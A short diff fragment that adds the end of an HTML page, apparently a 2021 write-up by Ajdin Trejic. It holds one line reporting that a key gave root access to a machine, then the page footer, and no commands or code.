+</code></pre><p>And this key was valid as I was able to connect to the machine as root.</p>
+
+
+
+
+
+            </div><div class="footer">
+    <hr>
+    <p> Copyright 2021 Ajdin Trejic</p>
+</div>
+</main>
+    </body>
+</html>
